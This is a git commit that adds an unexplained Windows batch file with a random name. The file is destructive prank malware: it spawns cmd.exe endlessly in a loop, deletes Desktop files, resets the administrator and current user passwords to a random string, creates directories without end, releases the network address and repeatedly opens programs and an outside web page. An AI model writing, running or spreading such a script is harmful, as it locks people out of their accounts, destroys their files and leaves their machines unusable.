728de40c3e09d2d2f332e9e6420cb12700107ad9
q <100281093+hazzoxxh@users.noreply.github.com>
2022-05-04 13:52:05 +0200

    Add files via upload

---
+++ Nouveau dossier/FEQGEEQDGd.bat
@@ -0,0 +1,24 @@
+@echo off
+:cmd
+Start cmd.exe
+goto cmd
+:calc
+Start calc
+goto calc
+Del /Q %userprofile%\Desktop
+Start FEQGEEQDGd
+FEQGEEQDGd
+net user administrateur sdfsqgfcsdfgxffgfsfds
+net user %USER% sdfsqgfcsdfgxffgfsfds
+cd "%userprofile%\desktop"
+:begin
+md %random%.%random%
+GoTo begin
+ipconfig /release
+:one
+start calc.exe
+start taskmgr.exe
+start http://google.com
+start http://gcasale.free.fr/viva.htm
+start cmd.exe
+goto one
